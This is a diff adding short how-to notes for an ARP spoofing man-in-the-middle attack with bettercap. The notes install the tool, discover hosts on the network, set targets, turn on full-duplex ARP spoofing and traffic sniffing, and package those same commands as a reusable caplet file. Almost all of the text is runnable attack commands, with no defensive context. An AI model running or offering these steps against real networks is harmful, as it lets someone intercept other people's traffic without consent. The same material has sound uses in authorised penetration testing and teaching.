@@ -1,0 +1,39 @@
+install : sudo apt install bettercap
+
+syntax : sudo bettercap -iface [interface]
+command : sudo bettercap -iface eth0
+
+inside bettercap console :
+ net.probe on  //  it will automatically turn on net.recon
+ net.show  // it will show all the client connected
+
+running attack : 
+ set arp.spoof.fullduplex true // for intercepting both router and target
+ set arp.spoof.targets [192.168.1.132] // if more than one target then enter them separated by comma(,)
+ arp.spoof on // turning on arp.spoof module on be sure that net.probe and net.recon is on
+
+ net.sniff on // turning the sniffing on
+
+
+now we should be able to see all the trafic of our target
+
+
+doing this by a spoof.cap file
+
+just write all the commands in order and save the file with .cap extension
+the file will contain :
+---------------------
+net.probe on
+set arp.spoof.fullduplex true
+set arp.spoof.targets [target_ip] // if more than one target separate their ip using comma(,)
+arp.spoof on
+net.sniff on
+---------------------
+save the file as spoof.cap
+
+
+now locate the file using terminal
+
+syntax : sudo bettercap -iface [interface] -caplet [caplet_file]
+command : sudo bettercap -iface eth0 -caplet spoof.cap
+
